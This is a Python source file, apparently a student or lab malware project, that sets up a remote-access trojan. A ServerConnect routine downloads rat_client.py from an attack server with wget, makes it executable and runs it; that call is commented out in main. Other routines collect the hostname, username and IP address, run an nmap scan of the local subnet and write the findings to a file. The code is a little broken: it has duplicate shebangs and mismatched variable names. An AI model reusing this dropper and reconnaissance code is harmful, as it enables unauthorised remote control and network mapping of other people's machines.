#!/usr/bin/env python3
#!/usr/bin/env import 
#!/usr/bin/bash

import base64
from operator import index
import random
import socket, subprocess, os, sys
import re
import json


class mal():
    global thisIP
    global userName
    global hostName
    global discoveredSubnet
    global discoveredIPs

#connect to our attack server and get the client file
    def ServerConnect():
        try:
            #try to ping server first
            subprocess.run(["ping", "-c", "1", "192.168.56.113"])
            #try to download the file from http server running
            subprocess.run(["wget", "192.168.56.113:80/rat_client.py"])
            #change permissions
            subprocess.run(["chmod", "+x",  "rat_client.py"])
            #execute client file
            subprocess.run(["./rat_client.py"])
            #exec(open("rat_client.py").read())
        except:
            print("error with server connect")


    #Find the current IP address of the machine, find subnet info to search with nmap
    def GetNetInfo(): 
        hostName = subprocess.run(['hostname'],capture_output=True)
        mal.hostName = str(hostName.stdout)[2:-3]
        #print("host name: " + mal.hostName)
        userName = subprocess.run(['whoami'],capture_output=True)
        mal.userName = str(userName.stdout)[2:-3]
        #print("username: " + mal.userName) 
        
        #ip address regex
        ipPattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
        #get ip address info on our host only adapter = enp0s8

        ipResult = subprocess.run(["ifconfig", "enp0s8"],capture_output=True)
        #print(ipResult.stdout)

        #search for IP address from command we ran
        mal.thisIP = ipPattern.search(str(ipResult))[0]
        #print("This machine IP Address: " + mal.thisIP)

        #create subnet string in cidr notation 
        dotcount = 0
        mal.discoveredSubnet = ''
        for char in mal.thisIP:
            if dotcount >= 3:
                mal.discoveredSubnet+= '0/24'
                break
            elif char != '.' and dotcount < 3:
                mal.discoveredSubnet+= char
            else:
                mal.discoveredSubnet+=char
                dotcount+=1
        #print("Subnet to target: " + mal.discoveredSubnet)

    #perform nmap scan
    def ScanNet():
        #ip address regex
        ipPattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')

        #todo run remotely from server without having nmap installed on compromised machine
        nmapResult = subprocess.run(["nmap", mal.discoveredSubnet], capture_output=True)
        #print(nmapResult.stdout)
        #find ip addresses from nmap results
        mal.discoveredIPs = ipPattern.search(str(mal.thisIP))[0]
        #print("Target IP Address discovered: " + mal.discoveredIPs)


        mal.discoveredIPS = ["192.168.56.114","192.168.56.115"]# TODO using hard coded IP for now TODO make a list of all IPs from nmap


    def WriteFile():
        myFile = str(mal.hostName) + ".pc"
        print(myFile)
        file = open(myFile,'wb')
        with open(myFile, 'w') as f:
            #f.write("port: " + str(random.randint(4000,4250))+'\n')   #not used.
            f.write("Hostname: " +mal.hostName + '\n')
            f.write("Username = " + mal.userName + '\n')
            f.write("IP Address: " + mal.thisIP + '\n')
            f.write("Subnet: " + mal.discoveredSubnet + '\n')
            for i in range(len(mal.discoveredIPS)):
                f.write("Discovered IP address " + str((i+1)) + ": " + mal.discoveredIPS[i] + '\n')   

#Dunder check

if __name__ == "__main__":
    mal.GetNetInfo()
    mal.ScanNet()
    mal.WriteFile()
    #mal.ServerConnect()

    
